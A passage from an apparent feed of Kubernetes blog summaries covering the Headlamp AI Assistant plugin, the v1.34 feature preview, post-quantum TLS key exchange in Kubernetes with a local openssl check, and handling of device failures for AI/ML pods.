      "summary": "<p><em>This announcement originally <a href=\"https://headlamp.dev/blog/2025/08/07/introducing-the-headlamp-ai-assistant\">appeared</a> on the Headlamp blog.</em></p>\n<p>To simplify Kubernetes management and troubleshooting, we're thrilled to\nintroduce <a href=\"https://github.com/headlamp-k8s/plugins/tree/main/ai-assistant#readme\">Headlamp AI Assistant</a>: a powerful new plugin for Headlamp that helps\nyou understand and operate your Kubernetes clusters and applications with\ngreater clarity and ease.</p>\n<p>Whether you're a seasoned engineer or just getting started, the AI Assistant offers:</p>\n<ul>\n<li><strong>Fast time to value:</strong> Ask questions like <em>&quot;Is my application healthy?&quot;</em> or\n<em>&quot;How can I fix this?&quot;</em> without needing deep Kubernetes knowledge.</li>\n<li><strong>Deep insights:</strong> Start with high-level queries and dig deeper with prompts\nlike <em>&quot;List all the problematic pods&quot;</em> or <em>&quot;How can I fix this pod?&quot;</em></li>\n<li><strong>Focused &amp; relevant:</strong> Ask questions in the context of what you're viewing\nin the UI, such as <em>&quot;What's wrong here?&quot;</em></li>\n<li><strong>Action-oriented:</strong> Let the AI take action for you, like <em>&quot;Restart that\ndeployment&quot;</em>, with your permission.</li>\n</ul>\n<p>Here is a demo of the AI Assistant in action as it helps troubleshoot an\napplication running with issues in a Kubernetes cluster:</p>\n<div class=\"youtube-quote-sm\">\n\n</div>\n<h2 id=\"hopping-on-the-ai-train\">Hopping on the AI train</h2>\n<p>Large Language Models (LLMs) have transformed not just how we access data but\nalso how we interact with it. The rise of tools like ChatGPT opened a world of\npossibilities, inspiring a wave of new applications. Asking questions or giving\ncommands in natural language is intuitive, especially for users who aren't deeply\ntechnical. Now everyone can quickly ask how to do X or Y, without feeling awkward\nor having to traverse pages and pages of documentation like before.</p>\n<p>Therefore, Headlamp AI Assistant brings a conversational UI to <a href=\"https://headlamp.dev\">Headlamp</a>,\npowered by LLMs that Headlamp users can configure with their own API keys.\nIt is available as a Headlamp plugin, making it easy to integrate into your\nexisting setup. Users can enable it by installing the plugin and configuring\nit with their own LLM API keys, giving them control over which model powers\nthe assistant. Once enabled, the assistant becomes part of the Headlamp UI,\nready to respond to contextual queries and perform actions directly from the\ninterface.</p>\n<h2 id=\"context-is-everything\">Context is everything</h2>\n<p>As expected, the AI Assistant is focused on helping users with Kubernetes\nconcepts. Yet, while there is a lot of value in responding to Kubernetes\nrelated questions from Headlamp's UI, we believe that the great benefit of such\nan integration is when it can use the context of what the user is experiencing\nin an application. So, the Headlamp AI Assistant knows what you're currently\nviewing in Headlamp, and this makes the interaction feel more like working\nwith a human assistant.</p>\n<p>For example, if a pod is failing, users can simply ask <em>&quot;What's wrong here?&quot;</em>\nand the AI Assistant will respond with the root cause, like a missing\nenvironment variable or a typo in the image name. Follow-up prompts like\n<em>&quot;How can I fix this?&quot;</em> allow the AI Assistant to suggest a fix, streamlining\nwhat used to take multiple steps into a quick, conversational flow.</p>\n<p>Sharing the context from Headlamp is not a trivial task though, so it's\nsomething we will keep working on perfecting.</p>\n<h2 id=\"tools\">Tools</h2>\n<p>Context from the UI is helpful, but sometimes additional capabilities are\nneeded. If the user is viewing the pod list and wants to identify problematic\ndeployments, switching views should not be necessary. To address this, the AI\nAssistant includes support for a Kubernetes tool. This allows asking questions\nlike &quot;Get me all deployments with problems&quot; prompting the assistant to fetch\nand display relevant data from the current cluster. Likewise, if the user\nrequests an action like &quot;Restart that deployment&quot; after the AI points out what\ndeployment needs restarting, it can also do that. In case of &quot;write&quot;\noperations, the AI Assistant does check with the user for permission to run them.</p>\n<h2 id=\"ai-plugins\">AI Plugins</h2>\n<p>Although the initial version of the AI Assistant is already useful for\nKubernetes users, future iterations will expand its capabilities. Currently,\nthe assistant supports only the Kubernetes tool, but further integration with\nHeadlamp plugins is underway. Similarly, we could get richer insights for\nGitOps via the Flux plugin, monitoring through Prometheus, package management\nwith Helm, and more.</p>\n<p>And of course, as the popularity of MCP grows, we are looking into how to\nintegrate it as well, for a more plug-and-play fashion.</p>\n<h2 id=\"try-it-out\">Try it out!</h2>\n<p>We hope this first version of the AI Assistant helps users manage Kubernetes\nclusters more effectively and assist newcomers in navigating the learning\ncurve. We invite you to try out this early version and give us your feedback.\nThe AI Assistant plugin can be installed from Headlamp's Plugin Catalog in the\ndesktop version, or by using the container image when deploying Headlamp.\nStay tuned for the future versions of the Headlamp AI Assistant!</p>",

      "summary": "<p>Kubernetes v1.34 is coming at the end of August 2025.\nThis release will not include any removal or deprecation, but it is packed with an impressive number of enhancements.\nHere are some of the features we are most excited about in this cycle!</p>\n<p>Please note that this information reflects the current state of v1.34 development and may change before release.</p>\n<h2 id=\"featured-enhancements-of-kubernetes-v1-34\">Featured enhancements of Kubernetes v1.34</h2>\n<p>The following list highlights some of the notable enhancements likely to be included in the v1.34 release,\nbut is not an exhaustive list of all planned changes.\nThis is not a commitment and the release content is subject to change.</p>\n<h3 id=\"the-core-of-dra-targets-stable\">The core of DRA targets stable</h3>\n<p><a href=\"https://kubernetes.io/docs/concepts/scheduling-eviction/dynamic-resource-allocation/\">Dynamic Resource Allocation</a> (DRA) provides a flexible way to categorize,\nrequest, and use devices like GPUs or custom hardware in your Kubernetes cluster.</p>\n<p>Since the v1.30 release, DRA has been based around claiming devices using <em>structured parameters</em> that are opaque to the core of Kubernetes.\nThe relevant enhancement proposal, <a href=\"https://kep.k8s.io/4381\">KEP-4381</a>, took inspiration from dynamic provisioning for storage volumes.\nDRA with structured parameters relies on a set of supporting API kinds: ResourceClaim, DeviceClass, ResourceClaimTemplate,\nand ResourceSlice API types under <code>resource.k8s.io</code>, while extending the <code>.spec</code> for Pods with a new <code>resourceClaims</code> field.\nThe core of DRA is targeting graduation to stable in Kubernetes v1.34.</p>\n<p>With DRA, device drivers and cluster admins define device classes that are available for use.\nWorkloads can claim devices from a device class within device requests.\nKubernetes allocates matching devices to specific claims and places the corresponding Pods on nodes that can access the allocated devices.\nThis framework provides flexible device filtering using CEL, centralized device categorization, and simplified Pod requests, among other benefits.</p>\n<p>Once this feature has graduated, the <code>resource.k8s.io/v1</code> APIs will be available by default.</p>\n<h3 id=\"serviceaccount-tokens-for-image-pull-authentication\">ServiceAccount tokens for image pull authentication</h3>\n<p>The <a href=\"https://kubernetes.io/docs/concepts/security/service-accounts/\">ServiceAccount</a> token integration for <code>kubelet</code> credential providers is likely to reach beta and be enabled by default in Kubernetes v1.34.\nThis allows the <code>kubelet</code> to use these tokens when pulling container images from registries that require authentication.</p>\n<p>That support already exists as alpha, and is tracked as part of <a href=\"https://kep.k8s.io/4412\">KEP-4412</a>.</p>\n<p>The existing alpha integration allows the <code>kubelet</code> to use short-lived, automatically rotated ServiceAccount tokens (that follow OIDC-compliant semantics) to authenticate to a container image registry.\nEach token is scoped to one associated Pod; the overall mechanism replaces the need for long-lived image pull Secrets.</p>\n<p>Adopting this new approach reduces security risks, supports workload-level identity, and helps cut operational overhead.\nIt brings image pull authentication closer to modern, identity-aware good practice.</p>\n<h3 id=\"pod-replacement-policy-for-deployments\">Pod replacement policy for Deployments</h3>\n<p>After a change to a <a href=\"https://kubernetes.io/docs/concepts/workloads/controllers/deployment/\">Deployment</a>, terminating pods may stay up for a considerable amount of time and may consume additional resources.\nAs part of <a href=\"https://kep.k8s.io/3973\">KEP-3973</a>, the <code>.spec.podReplacementPolicy</code> field will be introduced (as alpha) for Deployments.</p>\n<p>If your cluster has the feature enabled, you'll be able to select one of two policies:</p>\n<dl>\n<dt><code>TerminationStarted</code></dt>\n<dd>Creates new pods as soon as old ones start terminating, resulting in faster rollouts at the cost of potentially higher resource consumption.</dd>\n<dt><code>TerminationComplete</code></dt>\n<dd>Waits until old pods fully terminate before creating new ones, resulting in slower rollouts but ensuring controlled resource consumption.</dd>\n</dl>\n<p>This feature makes Deployment behavior more predictable by letting you choose when new pods should be created during updates or scaling.\nIt's beneficial when working in clusters with tight resource constraints or with workloads with long termination periods.</p>\n<p>It's expected to be available as an alpha feature and can be enabled using the <code>DeploymentPodReplacementPolicy</code> and <code>DeploymentReplicaSetTerminatingReplicas</code> feature gates in the API server and kube-controller-manager.</p>\n<h3 id=\"production-ready-tracing-for-kubelet-and-api-server\">Production-ready tracing for <code>kubelet</code> and API Server</h3>\n<p>To address the longstanding challenge of debugging node-level issues by correlating disconnected logs,\n<a href=\"https://kep.k8s.io/2831\">KEP-2831</a> provides deep, contextual insights into the <code>kubelet</code>.</p>\n<p>This feature instruments critical <code>kubelet</code> operations, particularly its gRPC calls to the Container Runtime Interface (CRI), using the vendor-agnostic OpenTelemetry standard.\nIt allows operators to visualize the entire lifecycle of events (for example: a Pod startup) to pinpoint sources of latency and errors.\nIts most powerful aspect is the propagation of trace context; the <code>kubelet</code> passes a trace ID with its requests to the container runtime, enabling runtimes to link their own spans.</p>\n<p>This effort is complemented by a parallel enhancement, <a href=\"https://kep.k8s.io/647\">KEP-647</a>, which brings the same tracing capabilities to the Kubernetes API server.\nTogether, these enhancements provide a more unified, end-to-end view of events, simplifying the process of pinpointing latency and errors from the control plane down to the node.\nThese features have matured through the official Kubernetes release process.\n<a href=\"https://kep.k8s.io/2831\">KEP-2831</a> was introduced as an alpha feature in v1.25, while <a href=\"https://kep.k8s.io/647\">KEP-647</a> debuted as alpha in v1.22.\nBoth enhancements were promoted to beta together in the v1.27 release.\nLooking forward, Kubelet Tracing (<a href=\"https://kep.k8s.io/2831\">KEP-2831</a>) and API Server Tracing (<a href=\"https://kep.k8s.io/647\">KEP-647</a>) are now targeting graduation to stable in the upcoming v1.34 release.</p>\n<h3 id=\"prefersamezone-and-prefersamenode-traffic-distribution-for-services\"><code>PreferSameZone</code> and <code>PreferSameNode</code> traffic distribution for Services</h3>\n<p>The <code>spec.trafficDistribution</code> field within a Kubernetes <a href=\"https://kubernetes.io/docs/concepts/services-networking/service/\">Service</a> allows users to express preferences for how traffic should be routed to Service endpoints.</p>\n<p><a href=\"https://kep.k8s.io/3015\">KEP-3015</a> deprecates <code>PreferClose</code> and introduces two additional values: <code>PreferSameZone</code> and <code>PreferSameNode</code>.\n<code>PreferSameZone</code> is equivalent to the current <code>PreferClose</code>.\n<code>PreferSameNode</code> prioritizes sending traffic to endpoints on the same node as the client.</p>\n<p>This feature was introduced in v1.33 behind the <code>PreferSameTrafficDistribution</code> feature gate.\nIt is targeting graduation to beta in v1.34 with its feature gate enabled by default.</p>\n<h3 id=\"support-for-kyaml-a-kubernetes-dialect-of-yaml\">Support for KYAML: a Kubernetes dialect of YAML</h3>\n<p>KYAML aims to be a safer and less ambiguous YAML subset, and was designed specifically\nfor Kubernetes. Whatever version of Kubernetes you use, you'll be able use KYAML for writing manifests\nand/or Helm charts.\nYou can write KYAML and pass it as an input to <strong>any</strong> version of <code>kubectl</code>,\nbecause all KYAML files are also valid as YAML.\nWith kubectl v1.34, we expect you'll also be able to request KYAML output from <code>kubectl</code> (as in <code>kubectl get -o kyaml …</code>).\nIf you prefer, you can still request the output in JSON or YAML format.</p>\n<p>KYAML addresses specific challenges with both YAML and JSON.\nYAML's significant whitespace requires careful attention to indentation and nesting,\nwhile its optional string-quoting can lead to unexpected type coercion (for example: <a href=\"https://hitchdev.com/strictyaml/why/implicit-typing-removed/\">&quot;The Norway Bug&quot;</a>).\nMeanwhile, JSON lacks comment support and has strict requirements for trailing commas and quoted keys.</p>\n<p><a href=\"https://kep.k8s.io/5295\">KEP-5295</a> introduces KYAML, which tries to address the most significant problems by:</p>\n<ul>\n<li>\n<p>Always double-quoting value strings</p>\n</li>\n<li>\n<p>Leaving keys unquoted unless they are potentially ambiguous</p>\n</li>\n<li>\n<p>Always using <code>{}</code> for mappings (associative arrays)</p>\n</li>\n<li>\n<p>Always using <code>[]</code> for lists</p>\n</li>\n</ul>\n<p>This might sound a lot like JSON, because it is! But unlike JSON, KYAML supports comments, allows trailing commas, and doesn't require quoted keys.</p>\n<p>We're hoping to see KYAML introduced as a new output format for <code>kubectl</code> v1.34.\nAs with all these features, none of these changes are 100% confirmed; watch this space!</p>\n<p>As a format, KYAML is and will remain a <strong>strict subset of YAML</strong>, ensuring that any compliant YAML parser can parse KYAML documents.\nKubernetes does not require you to provide input specifically formatted as KYAML, and we have no plans to change that.</p>\n<h3 id=\"fine-grained-autoscaling-control-with-hpa-configurable-tolerance\">Fine-grained autoscaling control with HPA configurable tolerance</h3>\n<p><a href=\"https://kep.k8s.io/4951\">KEP-4951</a> introduces a new feature that allows users to configure autoscaling tolerance on a per-HPA basis,\noverriding the default cluster-wide 10% tolerance setting that often proves too coarse-grained for diverse workloads.\nThe enhancement adds an optional <code>tolerance</code> field to the HPA's <code>spec.behavior.scaleUp</code> and <code>spec.behavior.scaleDown</code> sections,\nenabling different tolerance values for scale-up and scale-down operations,\nwhich is particularly valuable since scale-up responsiveness is typically more critical than scale-down speed for handling traffic surges.</p>\n<p>Released as alpha in Kubernetes v1.33 behind the <code>HPAConfigurableTolerance</code> feature gate, this feature is expected to graduate to beta in v1.34.\nThis improvement helps to address scaling challenges with large deployments, where for scaling in,\na 10% tolerance might mean leaving hundreds of unnecessary Pods running.\nUsing the new, more flexible approach would enable workload-specific optimization for both\nresponsive and conservative scaling behaviors.</p>\n<h2 id=\"want-to-know-more\">Want to know more?</h2>\n<p>New features and deprecations are also announced in the Kubernetes release notes.\nWe will formally announce what's new in <a href=\"https://github.com/kubernetes/kubernetes/blob/master/CHANGELOG/CHANGELOG-1.34.md\">Kubernetes v1.34</a> as part of the CHANGELOG for that release.</p>\n<p>The Kubernetes v1.34 release is planned for <strong>Wednesday 27th August 2025</strong>.

      "summary": "<p>The world of cryptography is on the cusp of a major shift with the advent of\nquantum computing. While powerful quantum computers are still largely\ntheoretical for many applications, their potential to break current\ncryptographic standards is a serious concern, especially for long-lived\nsystems. This is where <em>Post-Quantum Cryptography</em> (PQC) comes in. In this\narticle, I'll dive into what PQC means for TLS and, more specifically, for the\nKubernetes ecosystem. I'll explain what the (suprising) state of PQC in\nKubernetes is and what the implications are for current and future clusters.</p>\n<h2 id=\"what-is-post-quantum-cryptography\">What is Post-Quantum Cryptography</h2>\n<p>Post-Quantum Cryptography refers to cryptographic algorithms that are thought to\nbe secure against attacks by both classical and quantum computers. The primary\nconcern is that quantum computers, using algorithms like <a href=\"https://en.wikipedia.org/wiki/Shor%27s_algorithm\">Shor's Algorithm</a>,\ncould efficiently break widely used public-key cryptosystems such as RSA and\nElliptic Curve Cryptography (ECC), which underpin much of today's secure\ncommunication, including TLS. The industry is actively working on standardizing\nand adopting PQC algorithms. One of the first to be standardized by <a href=\"https://www.nist.gov/\">NIST</a> is\nthe Module-Lattice Key Encapsulation Mechanism (<code>ML-KEM</code>), formerly known as\nKyber, and now standardized as <a href=\"https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.203.pdf\">FIPS-203</a> (PDF download).</p>\n<p>It is difficult to predict when quantum computers will be able to break\nclassical algorithms. However, it is clear that we need to start migrating to\nPQC algorithms now, as the next section shows. To get a feeling for the\npredicted timeline we can look at a <a href=\"https://nvlpubs.nist.gov/nistpubs/ir/2024/NIST.IR.8547.ipd.pdf\">NIST report</a> covering the transition to\npost-quantum cryptography standards. It declares that system with classical\ncrypto should be deprecated after 2030 and disallowed after 2035.</p>\n<h2 id=\"timelines\">Key exchange vs. digital signatures: different needs, different timelines</h2>\n<p>In TLS, there are two main cryptographic operations we need to secure:</p>\n<p><strong>Key Exchange</strong>: This is how the client and server agree on a shared secret to\nencrypt their communication. If an attacker records encrypted traffic today,\nthey could decrypt it in the future, if they gain access to a quantum computer\ncapable of breaking the key exchange. This makes migrating KEMs to PQC an\nimmediate priority.</p>\n<p><strong>Digital Signatures</strong>: These are primarily used to authenticate the server (and\nsometimes the client) via certificates. The authenticity of a server is\nverified at the time of connection. While important, the risk of an attack\ntoday is much lower, because the decision of trusting a server cannot be abused\nafter the fact. Additionally, current PQC signature schemes often come with\nsignificant computational overhead and larger key/signature sizes compared to\ntheir classical counterparts.</p>\n<p>Another significant hurdle in the migration to PQ certificates is the upgrade\nof root certificates. These certificates have long validity periods and are\ninstalled in many devices and operating systems as trust anchors.</p>\n<p>Given these differences, the focus for immediate PQC adoption in TLS has been\non hybrid key exchange mechanisms. These combine a classical algorithm (such as\nElliptic Curve Diffie-Hellman Ephemeral (ECDHE)) with a PQC algorithm (such as\n<code>ML-KEM</code>). The resulting shared secret is secure as long as at least one of the\ncomponent algorithms remains unbroken. The <code>X25519MLKEM768</code> hybrid scheme is the\nmost widely supported one.</p>\n<h2 id=\"state-of-kems\">State of PQC key exchange mechanisms (KEMs) today</h2>\n<p>Support for PQC KEMs is rapidly improving across the ecosystem.</p>\n<p><strong>Go</strong>: The Go standard library's <code>crypto/tls</code> package introduced support for\n<code>X25519MLKEM768</code> in version 1.24 (released February 2025). Crucially, it's\nenabled by default when there is no explicit configuration, i.e.,\n<code>Config.CurvePreferences</code> is <code>nil</code>.</p>\n<p><strong>Browsers &amp; OpenSSL</strong>: Major browsers like Chrome (version 131, November 2024)\nand Firefox (version 135, February 2025), as well as OpenSSL (version 3.5.0,\nApril 2025), have also added support for the <code>ML-KEM</code> based hybrid scheme.</p>\n<p>Apple is also <a href=\"https://support.apple.com/en-lb/122756\">rolling out support</a> for <code>X25519MLKEM768</code> in version\n26 of their operating systems. Given the proliferation of Apple devices, this\nwill have a significant impact on the global PQC adoption.</p>\n<p>For a more detailed overview of the state of PQC in the wider industry,\nsee <a href=\"https://blog.cloudflare.com/pq-2024/\">this blog post by Cloudflare</a>.</p>\n<h2 id=\"post-quantum-kems-in-kubernetes-an-unexpected-arrival\">Post-quantum KEMs in Kubernetes: an unexpected arrival</h2>\n<p>So, what does this mean for Kubernetes? Kubernetes components, including the\nAPI server and kubelet, are built with Go.</p>\n<p>As of Kubernetes v1.33, released in April 2025, the project uses Go 1.24. A\nquick check of the Kubernetes codebase reveals that <code>Config.CurvePreferences</code>\nis not explicitly set. This leads to a fascinating conclusion: Kubernetes\nv1.33, by virtue of using Go 1.24, supports hybrid post-quantum\n<code>X25519MLKEM768</code> for TLS connections by default!</p>\n<p>You can test this yourself. If you set up a Minikube cluster running Kubernetes\nv1.33.0, you can connect to the API server using a recent OpenSSL client:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-console\"><span style=\"display: flex;\"><span><span style=\"color: #000080; font-weight: bold;\">$</span> minikube start --kubernetes-version<span style=\"color: #666;\">=</span>v1.33.0\n</span></span><span style=\"display: flex;\"><span><span style=\"color: #000080; font-weight: bold;\">$</span> kubectl cluster-info\n</span></span><span style=\"display: flex;\"><span><span style=\"color: #888;\">Kubernetes control plane is running at https://127.0.0.1:&lt;PORT&gt;\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #888;\"></span><span style=\"color: #000080; font-weight: bold;\">$</span> kubectl config view --minify --raw -o <span style=\"color: #b8860b;\">jsonpath</span><span style=\"color: #666;\">=</span><span style=\"color: #b62; font-weight: bold;\">\\'</span><span style=\"color: #666;\">{</span>.clusters<span style=\"color: #666;\">[</span>0<span style=\"color: #666;\">]</span>.cluster.certificate-authority-data<span style=\"color: #666;\">}</span><span style=\"color: #b62; font-weight: bold;\">\\'</span> | base64 -d &gt; ca.crt\n</span></span><span style=\"display: flex;\"><span><span style=\"color: #000080; font-weight: bold;\">$</span> openssl version\n</span></span><span style=\"display: flex;\"><span><span style=\"color: #888;\">OpenSSL 3.5.0 8 Apr 2025 (Library: OpenSSL 3.5.0 8 Apr 2025)\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #888;\"></span><span style=\"color: #000080; font-weight: bold;\">$</span> <span style=\"color: #a2f;\">echo</span> -n <span style=\"color: #b44;\">\"Q\"</span> | openssl s_client -connect 127.0.0.1:&lt;PORT&gt; -CAfile ca.crt\n</span></span><span style=\"display: flex;\"><span><span style=\"color: #888;\">[...]\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #888;\">Negotiated TLS1.3 group: X25519MLKEM768\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #888;\">[...]\n</span></span></span><span style=\"display: flex;\"><span><span style=\"color: #888;\">DONE\n</span></span></span></code></pre></div><p>Lo and behold, the negotiated group is <code>X25519MLKEM768</code>! This is a significant\nstep towards making Kubernetes quantum-safe, seemingly without a major\nannouncement or dedicated KEP (Kubernetes Enhancement Proposal).</p>\n<h2 id=\"the-go-version-mismatch-pitfall\">The Go version mismatch pitfall</h2>\n<p>An interesting wrinkle emerged with Go versions 1.23 and 1.24. Go 1.23\nincluded experimental support for a draft version of <code>ML-KEM</code>, identified as\n<code>X25519Kyber768Draft00</code>. This was also enabled by default if\n<code>Config.CurvePreferences</code> was <code>nil</code>. Kubernetes v1.32 used Go 1.23. However,\nGo 1.24 removed the draft support and replaced it with the standardized version\n<code>X25519MLKEM768</code>.</p>\n<p>What happens if a client and server are using mismatched Go versions (one on\n1.23, the other on 1.24)? They won't have a common PQC KEM to negotiate, and\nthe handshake will fall back to classical ECC curves (e.g., <code>X25519</code>). How\ncould this happen in practice?</p>\n<p>Consider a scenario:</p>\n<p>A Kubernetes cluster is running v1.32 (using Go 1.23 and thus\n<code>X25519Kyber768Draft00</code>). A developer upgrades their <code>kubectl</code> to v1.33,\ncompiled with Go 1.24, only supporting <code>X25519MLKEM768</code>. Now, when <code>kubectl</code>\ncommunicates with the v1.32 API server, they no longer share a common PQC\nalgorithm. The connection will downgrade to classical cryptography, silently\nlosing the PQC protection that has been in place. This highlights the\nimportance of understanding the implications of Go version upgrades, and the\ndetails of the TLS stack.</p>\n<h2 id=\"limitation-packet-size\">Limitations: packet size</h2>\n<p>One practical consideration with <code>ML-KEM</code> is the size of its public keys\nwith encoded key sizes of around 1.2 kilobytes for <code>ML-KEM-768</code>.\nThis can cause the initial TLS <code>ClientHello</code> message not to fit inside\na single TCP/IP packet, given the typical networking constraints\n(most commonly, the standard Ethernet frame size limit of 1500\nbytes). Some TLS libraries or network appliances might not handle this\ngracefully, assuming the Client Hello always fits in one packet. This issue\nhas been observed in some Kubernetes-related projects and networking\ncomponents, potentially leading to connection failures when PQC KEMs are used.\nMore details can be found at <a href=\"https://tldr.fail/\">tldr.fail</a>.</p>\n<h2 id=\"state-of-post-quantum-signatures\">State of Post-Quantum Signatures</h2>\n<p>While KEMs are seeing broader adoption, PQC digital signatures are further\nbehind in terms of widespread integration into standard toolchains. NIST has\npublished standards for PQC signatures, such as <code>ML-DSA</code> (<code>FIPS-204</code>) and\n<code>SLH-DSA</code> (<code>FIPS-205</code>). However, implementing these in a way that's broadly\nusable (e.g., for PQC Certificate Authorities) <a href=\"https://blog.cloudflare.com/another-look-at-pq-signatures/#the-algorithms\">presents challenges</a>:</p>\n<p><strong>Larger Keys and Signatures</strong>: PQC signature schemes often have significantly\nlarger public keys and signature sizes compared to classical algorithms like\nEd25519 or RSA. For instance, Dilithium2 keys can be 30 times larger than\nEd25519 keys, and certificates can be 12 times larger.</p>\n<p><strong>Performance</strong>: Signing and verification operations <a href=\"https://pqshield.github.io/nist-sigs-zoo/\">can be substantially slower</a>.\nWhile some algorithms are on par with classical algorithms, others may have a\nmuch higher overhead, sometimes on the order of 10x to 1000x worse performance.\nTo improve this situation, NIST is running a\n<a href=\"https://csrc.nist.gov/news/2024/pqc-digital-signature-second-round-announcement\">second round of standardization</a> for PQC signatures.</p>\n<p><strong>Toolchain Support</strong>: Mainstream TLS libraries and CA software do not yet have\nmature, built-in support for these new signature algorithms. The Go team, for\nexample, has indicated that <code>ML-DSA</code> support is a high priority, but the\nsoonest it might appear in the standard library is Go 1.26 <a href=\"https://github.com/golang/go/issues/64537#issuecomment-2877714729\">(as of May 2025)</a>.</p>\n<p><a href=\"https://github.com/cloudflare/circl\">Cloudflare's CIRCL</a> (Cloudflare Interoperable Reusable Cryptographic Library)\nlibrary implements some PQC signature schemes like variants of Dilithium, and\nthey maintain a <a href=\"https://github.com/cloudflare/go\">fork of Go (cfgo)</a> that integrates CIRCL. Using <code>cfgo</code>, it's\npossible to experiment with generating certificates signed with PQC algorithms\nlike Ed25519-Dilithium2. However, this requires using a custom Go toolchain and\nis not yet part of the mainstream Kubernetes or Go distributions.</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>The journey to a post-quantum secure Kubernetes is underway, and perhaps\nfurther along than many realize, thanks to the proactive adoption of <code>ML-KEM</code>\nin Go. With Kubernetes v1.33, users are already benefiting from hybrid post-quantum key\nexchange in many TLS connections by default.</p>\n<p>However, awareness of potential pitfalls, such as Go version mismatches leading\nto downgrades and issues with Client Hello packet sizes, is crucial. While PQC\nfor KEMs is becoming a reality, PQC for digital signatures and certificate\nhierarchies is still in earlier stages of development and adoption for\nmainstream use. As Kubernetes maintainers and contributors, staying informed\nabout these developments will be key to ensuring the long-term security of the\nplatform.</p>",

These\nworkloads often rely heavily on specialized hardware, and any device failure can\nsignificantly impact performance and lead to frustrating interruptions. As\nhighlighted in the 2024 <a href=\"https://ai.meta.com/research/publications/the-llama-3-herd-of-models/\">Llama\npaper</a>,\nhardware issues, particularly GPU failures, are a major cause of disruption in\nAI/ML training. You can also learn how much effort NVIDIA spends on handling\ndevices failures and maintenance in the KubeCon talk by <a href=\"https://kccncna2024.sched.com/event/1i7kJ/all-your-gpus-are-belong-to-us-an-inside-look-at-nvidias-self-healing-geforce-now-infrastructure-ryan-hallisey-piotr-prokop-pl-nvidia\">Ryan Hallisey and Piotr\nProkop All-Your-GPUs-Are-Belong-to-Us: An Inside Look at NVIDIA's Self-Healing\nGeForce NOW\nInfrastructure</a>\n(<a href=\"https://www.youtube.com/watch?v=iLnHtKwmu2I\">recording</a>) as they see 19\nremediation requests per 1000 nodes a day!\nWe also see data centers offering spot consumption models and overcommit on\npower, making device failures commonplace and a part of the business model.</p>\n<p>However, Kubernetes’s view on resources is still very static. The resource is\neither there or not. And if it is there, the assumption is that it will stay\nthere fully functional - Kubernetes lacks good support for handling full or partial\nhardware failures. These long-existing assumptions combined with the overall complexity of a setup lead\nto a variety of failure modes, which we discuss here.</p>\n<h3 id=\"understanding-ai-ml-workloads\">Understanding AI/ML workloads</h3>\n<p>Generally, all AI/ML workloads require specialized hardware, have challenging\nscheduling requirements, and are expensive when idle. AI/ML workloads typically\nfall into two categories - training and inference. Here is an oversimplified\nview of those categories’ characteristics, which are different from traditional workloads\nlike web services:</p>\n<dl>\n<dt>Training</dt>\n<dd>These workloads are resource-intensive, often consuming entire\nmachines and running as gangs of pods. Training jobs are usually &quot;run to\ncompletion&quot; - but that could be days, weeks or even months. Any failure in a\nsingle pod can necessitate restarting the entire step across all the pods.</dd>\n<dt>Inference</dt>\n<dd>These workloads are usually long-running or run indefinitely,\nand can be small enough to consume a subset of a Node’s devices or large enough to span\nmultiple nodes.

Despite many challenges, Kubernetes remains the platform of choice\nfor AI/ML workloads. Its maturity, security, and rich ecosystem of tools make it\na compelling option. While alternatives exist, they often lack the years of\ndevelopment and refinement that Kubernetes offers. And the Kubernetes developers\nare actively addressing the gaps identified in this article and beyond.</p>\n<h2 id=\"the-current-state-of-device-failure-handling\">The current state of device failure handling</h2>\n<p>This section outlines different failure modes and the best practices and DIY\n(Do-It-Yourself) solutions used today. The next session will describe a roadmap\nof improving things for those failure modes.</p>\n<h3 id=\"failure-modes-k8s-infrastructure\">Failure modes: K8s infrastructure</h3>\n<p>In order to understand the failures related to the Kubernetes infrastructure,\nyou need to understand how many moving parts are involved in scheduling a Pod on\nthe node. The sequence of events when the Pod is scheduled in the Node is as\nfollows:</p>\n<ol>\n<li><em>Device plugin</em> is scheduled on the Node</li>\n<li><em>Device plugin</em> is registered with the <em>kubelet</em> via local gRPC</li>\n<li><em>Kubelet</em> uses <em>device plugin</em> to watch for devices and updates capacity of\nthe node</li>\n<li><em>Scheduler</em> places a <em>user Pod</em> on a Node based on the updated capacity</li>\n<li><em>Kubelet</em> asks <em>Device plugin</em> to <strong>Allocate</strong> devices for a <em>User Pod</em></li>\n<li><em>Kubelet</em> creates a <em>User Pod</em> with the allocated devices attached to it</li>\n</ol>\n<p>This diagram shows some of those actors involved:</p>\n<figure>\n<img alt=\"The diagram shows relationships between the kubelet, Device plugin, and a user Pod. It shows that kubelet connects to the Device plugin named my-device, kubelet reports the node status with the my-device availability, and the user Pod requesting the 2 of my-device.\" src=\"https://kubernetes.io/blog/2025/07/03/navigating-failures-in-pods-with-devices/k8s-infra-devices.svg\" />\n</figure>\n<p>As there are so many actors interconnected, every one of them and every\nconnection may experience interruptions. This leads to many exceptional\nsituations that are often considered failures, and may cause serious workload\ninterruptions:</p>\n<ul>\n<li>Pods failing admission at various stages of its lifecycle</li>\n<li>Pods unable to run on perfectly fine hardware</li>\n<li>Scheduling taking unexpectedly long time</li>\n</ul>\n<figure>\n<img alt=\"The same diagram as one above it, however it has an overlayed orange bang drawings over individual components with the text indicating what can break in that component. Over the kubelet text reads: 'kubelet restart: looses all devices info before re-Watch'. Over the Device plugin text reads: 'device plugin update, evictIon, restart: kubelet cannot Allocate devices or loses all devices state'. Over the user Pod text reads: 'slow pod termination: devices are unavailable'.\" src=\"https://kubernetes.io/blog/2025/07/03/navigating-failures-in-pods-with-devices/k8s-infra-failures.svg\" />\n</figure>\n<p>The goal for Kubernetes is to make the interruption between these components as\nreliable as possible. Kubelet already implements retries, grace periods, and\nother techniques to improve it. The roadmap section goes into details on other\nedge cases that the Kubernetes project tracks. However, all these improvements\nonly work when these best practices are followed:</p>\n<ul>\n<li>Configure and restart kubelet and the container runtime (such as containerd or CRI-O)\nas early as possible to not interrupt the workload.</li>\n<li>Monitor device plugin health and carefully plan for upgrades.</li>\n<li>Do not overload the node with less-important workloads to prevent interruption\nof device plugin and other components.</li>\n<li>Configure user pods tolerations to handle node readiness flakes.</li>\n<li>Configure and code graceful termination logic carefully to not block devices\nfor 